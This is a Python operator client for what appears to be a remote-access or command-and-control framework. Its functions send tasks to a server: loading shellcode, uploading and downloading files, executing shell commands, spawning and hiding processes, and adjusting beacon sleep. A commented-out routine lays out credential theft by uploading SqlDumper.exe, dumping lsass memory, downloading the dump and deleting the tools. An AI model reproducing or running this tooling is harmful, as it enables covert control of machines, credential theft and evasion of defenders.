# -*- coding:utf-8 -*-
import requests
import json
import os
import time
from aiohttp import *
from b64 import *


# remote_ip = "192.168.2.247"
remote_ip = "192.168.2.183"
# hostname = 'DESKTOP-VM1SQ6J'
hostname = "DESKTOP-6S9MQ91"
shellcode_path = "C:\\PythonWorkSpace\\tornado_server\\"

global server_address
server_address = "127.0.0.1:80"


def read_bin(file_path):
    with open(file_path, "rb") as f:
        shellcode = f.read()
        # print(shellcode)
        return encode(shellcode)

def get_file_size(file_path):
    fsize = os.path.getsize(file_path)
    return fsize

def test_shellcode_load(remote_ip, hostname, manager):
    global server_address
    data = {'ip': remote_ip, 'hostname': hostname, 'type': manager, 'operation': 'load', 'data': manager}
    # print(data)
    data = json.dumps(data)
    # print(data)
    # async with request("POST", "http://127.0.0.1:8080/task") as r:
    #     response = await r.text()
    r = requests.post("http://" + server_address + "/task", data=data)
    print(r.text)


def test_upload_file(remote_ip, hostname, file_path, file_name):
    global server_address
    # print("file_name:", file_name)
    # 打开文件,base64
    file = read_bin(file_name)
    file_size = get_file_size(file_name)
    file_name = file_name.split("\\")[-1]
    # print("file_name:", file_name)
    flag = True
    while flag:
        # print(file_size)
        # 构造请求
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'upload', 'file_name': file_path + file_name, 'file_len': str(file_size), 'data': file}
        # 发送请求
        data = json.dumps(data)
        # print(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        print("in upload file")
        print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)


def test_download_file(remote_ip, hostname, file_path):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'download', "file_name": file_path}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)


def test_del_file(remote_ip, hostname, file_path):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'del_file', "data": file_path}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)

def test_del_folder(remote_ip, hostname, folder_path):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'del_folder', "data": folder_path}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)

def test_rename_file(remote_ip, hostname, old_file_name, new_file_name):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'rename', "old_name": old_file_name, 'new_name': new_file_name}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)


def test_sleep_time(remote_ip, hostname, sleep_time, type):
    global server_address
    data = {'ip': remote_ip, 'hostname': hostname, 'operation': 'sleep', "data": str(sleep_time), 'type': "client"}
    data = json.dumps(data)
    r = requests.post("http://" + server_address + "/task", data=data)
    # print(r.text)
    return r.text

def test_stop_task(remote_ip, hostname, type):
    global server_address
    data = {'ip': remote_ip, 'hostname': hostname, 'type': type, 'operation': 'stop', "data": type}
    print(data)
    data = json.dumps(data)
    r = requests.post("http://" + server_address + "/task", data=data)
    # print(r.text)
    return r.text


def test_list_drivers(remote_ip, hostname):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'list_drivers', 'data': 'null'}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)


def test_exec_cmd(remote_ip, hostname, commandline):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'shell', 'operation': 'exec', 'data': commandline}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print("res", res)
        # res = decrypt(res)
        # with open("qqqqqqqqqqqqqqqq.txt", "w") as f:
        #     f.write(res)
        # print(type(res))
        # print(res)
        if commandline in res.replace("//", "\\"):
            return res.replace("#$%^&", "\r\n")
        else:
            time.sleep(5)


def test_dir(remote_ip, hostname, path):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'dir', 'data': path}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        # res = decrypt(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)

def test_mkdir(remote_ip, hostname, path):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'file', 'operation': 'mkdir', 'data': path}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        if res != "wait moment":
            return res
        else:
            time.sleep(5)

def test_process(remote_ip, hostname, file_name, arg):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'process', 'operation': 'process', 'file_name': file_name, 'data': arg}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        # if res != "wait moment":
        if True:
            return res
        else:
            time.sleep(5)


def test_process2(remote_ip, hostname, file_name, arg):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'process2', 'operation': 'process', 'file_name': file_name, 'data': arg}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        # if res != "wait moment":
        if True:
            return res
        else:
            time.sleep(5)


def test_process3(remote_ip, hostname, file_name, arg):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'process3', 'operation': 'process', 'file_name': file_name, 'data': arg}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        # if res != "wait moment":
        if True:
            return res
        else:
            time.sleep(5)

def test_process4(remote_ip, hostname, file_name, arg):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'process4', 'operation': 'process', 'file_name': file_name, 'data': arg}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        # if res != "wait moment":
        if True:
            return res
        else:
            time.sleep(5)


def test_hideprocess(remote_ip, hostname, file_name, arg):
    global server_address
    flag = True
    while flag:
        data = {'ip': remote_ip, 'hostname': hostname, 'type': 'hideprocess', 'operation': 'hideprocess',
                'file_name': file_name, 'data': arg}
        data = json.dumps(data)
        r = requests.post("http://" + server_address + "/task", data=data)
        res = r.text
        # print(res)
        # if res != "wait moment":
        if True:
            return res
        else:
            time.sleep(5)

def get_session_list():
    global server_address
    r = requests.post("http://" + server_address + "/list")
    res = r.text
    # print(res)
    return res


def test_login(address, password):
    global server_address
    server_address = address
    url = "http://"+address+"/login"
    r = requests.post(url, data=password)
    res = r.text
    if res == "success":
        return True
    else:
        return False


def test_hash_dump():
    # load file shellcode
    test_shellcode_load("file")
    test_shellcode_load("shell")
    # test_shellcode_load("process")
    # mkdir
    # print(test_mkdir("C:\\PythonWorkSpace\\tornado_server\\test"))
    # upload sqldumper
    # print(test_upload_file("C:\\PythonWorkSpace\\tornado_server\\test\\", "SqlDumper.exe"))
    # tasklist | findstr lsass
    # print(test_exec_cmd("tasklist | findstr lsass"))
    # exec sqldumper
    # print(test_exec_cmd("ipconfig"))
    # print(test_exec_cmd("C:\\PythonWorkSpace\\tornado_server\\test\\Sqldumper.exe 1000 0 0x01100"))
    # download sqldumper.bin
    # print(test_download_file("C:\\Users\\bobo\\Desktop\\MouseWithoutBorders\\ClientExe\\SQLDmpr0001.mdmp"))
    # print(test_del_file("C:\\PythonWorkSpace\\tornado_server\\test\\SqlDumper.exe"))
    # print(test_del_folder("C:\\PythonWorkSpace\\tornado_server\\test"))
    # test_process("C:\\Users\\bobo\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe", "--kiosk")

# test_hash_dump()
